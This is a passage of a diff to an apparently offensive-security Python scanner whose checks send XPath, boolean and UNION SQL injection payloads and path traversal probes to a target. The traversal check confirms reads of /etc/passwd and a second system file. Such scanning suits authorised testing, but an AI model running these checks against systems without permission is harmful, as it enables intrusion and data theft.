-                for probe in _XPATH_INJECTION_PROBES:
-                    test_params = dict(existing_params)
-                    test_params[param_name] = probe
-                    test_url = parsed.copy_with(params=test_params)
-                    try:
-                        resp = await client.get(test_url)
-                    except httpx.HTTPError:
-                        continue
-                    for sig in _XPATH_ERROR_SIGNATURES:
-                        if sig in resp.text and sig not in baseline_body:
-                            return {
-                                "vuln_type": "xpath_injection_error_based",
-                                "severity": "medium",
-                                "evidence": (
-                                    f"{test_url}: parameter '{param_name}' with XPath-breaking "
-                                    f"probe {probe!r} triggered an XPath-specific error signature "
-                                    f"({sig!r}, absent from baseline)."
-                                ),
-                            }
+        for param_name in existing_params:
+            for probe in _XPATH_INJECTION_PROBES:
+                test_params = dict(existing_params)
+                test_params[param_name] = probe
+                test_url = parsed.copy_with(params=test_params)
+                try:
+                    resp = await client.get(test_url)
+                except httpx.HTTPError:
+                    continue
+                for sig in _XPATH_ERROR_SIGNATURES:
+                    if sig in resp.text and sig not in baseline_body:
+                        return {
+                            "vuln_type": "xpath_injection_error_based",
+                            "severity": "medium",
+                            "evidence": (
+                                f"{test_url}: parameter '{param_name}' with XPath-breaking "
+                                f"probe {probe!r} triggered an XPath-specific error signature "
+                                f"({sig!r}, absent from baseline)."
+                            ),
+                        }
     except httpx.HTTPError as exc:
         logger.info("detective: XPath injection check failed for %s: %s", url, exc)
     return None
@@ -1111,65 +1112,65 @@ async def check_sql_injection_boolean_based(url: str) -> dict | None:
     existing_params = dict(parsed.params)
 
     try:
-        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
+        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
+        try:
+            baseline_resp = await client.get(url)
+            baseline_body = baseline_resp.text
+        except httpx.HTTPError:
+            return None
+
+        for param_name in existing_params:
+            test_params_true = dict(existing_params)
+            test_params_true[param_name] = existing_params[param_name] + _SQLI_BOOLEAN_TRUE
+            true_url = parsed.copy_with(params=test_params_true)
+
+            test_params_false = dict(existing_params)
+            test_params_false[param_name] = existing_params[param_name] + _SQLI_BOOLEAN_FALSE
+            false_url = parsed.copy_with(params=test_params_false)
+
             try:
-                baseline_resp = await client.get(url)
-                baseline_body = baseline_resp.text
+                true_resp = await client.get(true_url)
+                false_resp = await client.get(false_url)
             except httpx.HTTPError:
-                return None
+                continue
 
-            for param_name in existing_params:
-                test_params_true = dict(existing_params)
-                test_params_true[param_name] = existing_params[param_name] + _SQLI_BOOLEAN_TRUE
-                true_url = parsed.copy_with(params=test_params_true)
+            # A WAF/edge proxy dropping the connection on obvious SQL
+            # syntax (' AND '1'='2 etc.) produces a 4xx/5xx status
+            # that looks exactly like "the query behaved differently"
+            # to a naive status-code diff - but that's the edge layer
+            # talking, not the database. If EITHER probe response is
+            # 4xx/5xx, this is not a trustworthy boolean-SQLi signal;
+            # bail out entirely rather than risk a WAF-block false
+            # positive (matches the real Agoda dead-end: TRUE payload
+            # got 200, FALSE payload got a WAF 502, tool flagged it as
+            # "database responding to boolean conditions").
+            if true_resp.status_code >= 400 or false_resp.status_code >= 400:
+                continue
 
-                test_params_false = dict(existing_params)
-                test_params_false[param_name] = existing_params[param_name] + _SQLI_BOOLEAN_FALSE
-                false_url = parsed.copy_with(params=test_params_false)
+            true_matches_baseline = (
+                true_resp.status_code == baseline_resp.status_code
+                and abs(len(true_resp.text) - len(baseline_body)) < max(20, len(baseline_body) * 0.02)
+            )
+            false_differs_from_baseline = (
+                false_resp.status_code != baseline_resp.status_code
+                or abs(len(false_resp.text) - len(baseline_body)) > max(20, len(baseline_body) * 0.02)
+            )
 
-                try:
-                    true_resp = await client.get(true_url)
-                    false_resp = await client.get(false_url)
-                except httpx.HTTPError:
-                    continue
-
-                # A WAF/edge proxy dropping the connection on obvious SQL
-                # syntax (' AND '1'='2 etc.) produces a 4xx/5xx status
-                # that looks exactly like "the query behaved differently"
-                # to a naive status-code diff - but that's the edge layer
-                # talking, not the database. If EITHER probe response is
-                # 4xx/5xx, this is not a trustworthy boolean-SQLi signal;
-                # bail out entirely rather than risk a WAF-block false
-                # positive (matches the real Agoda dead-end: TRUE payload
-                # got 200, FALSE payload got a WAF 502, tool flagged it as
-                # "database responding to boolean conditions").
-                if true_resp.status_code >= 400 or false_resp.status_code >= 400:
-                    continue
-
-                true_matches_baseline = (
-                    true_resp.status_code == baseline_resp.status_code
-                    and abs(len(true_resp.text) - len(baseline_body)) < max(20, len(baseline_body) * 0.02)
-                )
-                false_differs_from_baseline = (
-                    false_resp.status_code != baseline_resp.status_code
-                    or abs(len(false_resp.text) - len(baseline_body)) > max(20, len(baseline_body) * 0.02)
-                )
-
-                if true_matches_baseline and false_differs_from_baseline:
-                    return {
-                        "vuln_type": "sql_injection_boolean_based",
-                        "severity": "critical",
-                        "evidence": (
-                            f"{url} parameter '{param_name}': baseline body length "
-                            f"{len(baseline_body)}. Injecting an always-TRUE condition "
-                            f"({_SQLI_BOOLEAN_TRUE!r}) produced a response matching the "
-                            f"baseline ({len(true_resp.text)} bytes, status "
-                            f"{true_resp.status_code}), while an always-FALSE condition "
-                            f"({_SQLI_BOOLEAN_FALSE!r}) produced a different response "
-                            f"({len(false_resp.text)} bytes, status {false_resp.status_code}) - "
-                            f"the query logic is responding to injected boolean conditions."
-                        ),
-                    }
+            if true_matches_baseline and false_differs_from_baseline:
+                return {
+                    "vuln_type": "sql_injection_boolean_based",
+                    "severity": "critical",
+                    "evidence": (
+                        f"{url} parameter '{param_name}': baseline body length "
+                        f"{len(baseline_body)}. Injecting an always-TRUE condition "
+                        f"({_SQLI_BOOLEAN_TRUE!r}) produced a response matching the "
+                        f"baseline ({len(true_resp.text)} bytes, status "
+                        f"{true_resp.status_code}), while an always-FALSE condition "
+                        f"({_SQLI_BOOLEAN_FALSE!r}) produced a different response "
+                        f"({len(false_resp.text)} bytes, status {false_resp.status_code}) - "
+                        f"the query logic is responding to injected boolean conditions."
+                    ),
+                }
     except httpx.HTTPError as exc:
         logger.info("detective: boolean-based SQLi check failed for %s: %s", url, exc)
     return None
@@ -1206,37 +1207,37 @@ async def check_sqli_union_data_extraction(url: str) -> dict | None:
     marker = f"{_SQLI_UNION_VERSION_MARKER}{uuid.uuid4().hex[:8]}"
 
     try:
-        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
-            try:
-                baseline_resp = await client.get(url)
-                baseline_body = baseline_resp.text
-            except httpx.HTTPError:
-                return None
+        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
+        try:
+            baseline_resp = await client.get(url)
+            baseline_body = baseline_resp.text
+        except httpx.HTTPError:
+            return None
 
-            for param_name in existing_params:
-                for template in _SQLI_UNION_TEMPLATES:
-                    payload = template.format(marker=marker)
-                    test_params = dict(existing_params)
-                    test_params[param_name] = existing_params[param_name] + payload
-                    test_url = parsed.copy_with(params=test_params)
-                    try:
-                        resp = await client.get(test_url)
-                    except httpx.HTTPError:
-                        continue
-                    if resp.status_code >= 400:
-                        continue  # WAF/syntax rejection, not a database response
-                    if marker in resp.text and marker not in baseline_body:
-                        return {
-                            "vuln_type": "sql_injection_union_data_extraction",
-                            "severity": "critical",
-                            "evidence": (
-                                f"{test_url}: parameter '{param_name}' with a UNION SELECT "
-                                f"payload caused the application to echo back an "
-                                f"attacker-chosen literal string ({marker!r}) that was absent "
-                                f"from the baseline response - confirmed direct data "
-                                f"extraction via SQL injection, not just a blind signal."
-                            ),
-                        }
+        for param_name in existing_params:
+            for template in _SQLI_UNION_TEMPLATES:
+                payload = template.format(marker=marker)
+                test_params = dict(existing_params)
+                test_params[param_name] = existing_params[param_name] + payload
+                test_url = parsed.copy_with(params=test_params)
+                try:
+                    resp = await client.get(test_url)
+                except httpx.HTTPError:
+                    continue
+                if resp.status_code >= 400:
+                    continue  # WAF/syntax rejection, not a database response
+                if marker in resp.text and marker not in baseline_body:
+                    return {
+                        "vuln_type": "sql_injection_union_data_extraction",
+                        "severity": "critical",
+                        "evidence": (
+                            f"{test_url}: parameter '{param_name}' with a UNION SELECT "
+                            f"payload caused the application to echo back an "
+                            f"attacker-chosen literal string ({marker!r}) that was absent "
+                            f"from the baseline response - confirmed direct data "
+                            f"extraction via SQL injection, not just a blind signal."
+                        ),
+                    }
     except httpx.HTTPError as exc:
         logger.info("detective: SQLi UNION extraction check failed for %s: %s", url, exc)
     return None
@@ -1261,73 +1262,73 @@ async def check_lfi_arbitrary_file_confirmation(url: str) -> dict | None:
     existing_params = dict(parsed.params)
 
     try:
-        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
-            try:
-                baseline_resp = await client.get(url)
-                baseline_body = baseline_resp.text
-            except httpx.HTTPError:
-                return None
+        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
+        try:
+            baseline_resp = await client.get(url)
+            baseline_body = baseline_resp.text
+        except httpx.HTTPError:
+            return None
 
-            first_hit = None
-            for param_name in existing_params:
-                for probe in _PATH_TRAVERSAL_PROBES:
-                    test_params = dict(existing_params)
-                    test_params[param_name] = probe
-                    test_url = parsed.copy_with(params=test_params)
-                    try:
-                        resp = await client.get(test_url)
-                    except httpx.HTTPError:
-                        continue
-                    if any(sig in resp.text and sig not in baseline_body for sig in _PATH_TRAVERSAL_SIGNATURES):
-                        first_hit = (param_name, probe, resp.text)
-                        break
-                if first_hit:
-                    break
-
-            if not first_hit:
-                return None
-            param_name, working_probe, first_file_body = first_hit
-
-            # Swap the filename inside the EXACT payload that already
-            # proved to work for this endpoint (same directory depth,
-            # same encoding style - raw "../", "..%2f", "....//", or a
-            # bare "/etc/passwd") rather than reconstructing a new
-            # traversal prefix from scratch, which would risk testing a
-            # depth/encoding combination that was never actually proven.
-            if "passwd" in working_probe:
-                second_file_subs = ["hostname", "issue"]
-            elif "win.ini" in working_probe:
-                second_file_subs = ["system.ini"]
-            else:
-                return None
-
-            for second_filename in second_file_subs:
-                second_probe = working_probe.replace("passwd", second_filename).replace("win.ini", second_filename)
+        first_hit = None
+        for param_name in existing_params:
+            for probe in _PATH_TRAVERSAL_PROBES:
                 test_params = dict(existing_params)
-                test_params[param_name] = second_probe
+                test_params[param_name] = probe
                 test_url = parsed.copy_with(params=test_params)
                 try:
                     resp = await client.get(test_url)
                 except httpx.HTTPError:
                     continue
-                if resp.status_code >= 400 or not resp.text.strip():
-                    continue
-                if resp.text.strip() == baseline_body.strip():
-                    continue
-                if resp.text.strip() == first_file_body.strip():
-                    continue  # identical to the /etc/passwd response - not a genuinely different file
-                second_line = resp.text.strip().splitlines()[0][:120]
-                return {
-                    "vuln_type": "path_traversal_lfi_arbitrary_file_confirmed",
-                    "severity": "critical",
-                    "evidence": (
-                        f"{test_url}: parameter '{param_name}' already confirmed to read "
-                        f"/etc/passwd was also used to read a SECOND, unrelated file "
-                        f"({second_probe!r}), returning distinct content ({second_line!r}) - "
-                        f"confirms genuinely arbitrary file read, not a single coincidental "
-                        f"hardcoded route."
-                    ),
-                }
+                if any(sig in resp.text and sig not in baseline_body for sig in _PATH_TRAVERSAL_SIGNATURES):
+                    first_hit = (param_name, probe, resp.text)
+                    break
+            if first_hit:
+                break
+
+        if not first_hit:
+            return None
+        param_name, working_probe, first_file_body = first_hit
+
+        # Swap the filename inside the EXACT payload that already
+        # proved to work for this endpoint (same directory depth,
+        # same encoding style - raw "../", "..%2f", "....//", or a
+        # bare "/etc/passwd") rather than reconstructing a new
+        # traversal prefix from scratch, which would risk testing a
+        # depth/encoding combination that was never actually proven.
+        if "passwd" in working_probe:
+            second_file_subs = ["hostname", "issue"]
+        elif "win.ini" in working_probe:
+            second_file_subs = ["system.ini"]
+        else:
+            return None
+
+        for second_filename in second_file_subs:
+            second_probe = working_probe.replace("passwd", second_filename).replace("win.ini", second_filename)
+            test_params = dict(existing_params)
+            test_params[param_name] = second_probe
+            test_url = parsed.copy_with(params=test_params)
+            try:
+                resp = await client.get(test_url)
+            except httpx.HTTPError:
+                continue
+            if resp.status_code >= 400 or not resp.text.strip():
+                continue
+            if resp.text.strip() == baseline_body.strip():
+                continue
+            if resp.text.strip() == first_file_body.strip():
+                continue  # identical to the /etc/passwd response - not a genuinely different file
+            second_line = resp.text.strip().splitlines()[0][:120]
+            return {
+                "vuln_type": "path_traversal_lfi_arbitrary_file_confirmed",
+                "severity": "critical",
+                "evidence": (
+                    f"{test_url}: parameter '{param_name}' already confirmed to read "
+                    f"/etc/passwd was also used to read a SECOND, unrelated file "
+                    f"({second_probe!r}), returning distinct content ({second_line!r}) - "
+                    f"confirms genuinely arbitrary file read, not a single coincidental "
+                    f"hardcoded route."
+                ),
+            }
     except httpx.HTTPError as exc:
         logger.info("detective: LFI second-file confirmation check failed for %s: %s", url, exc)
     return None
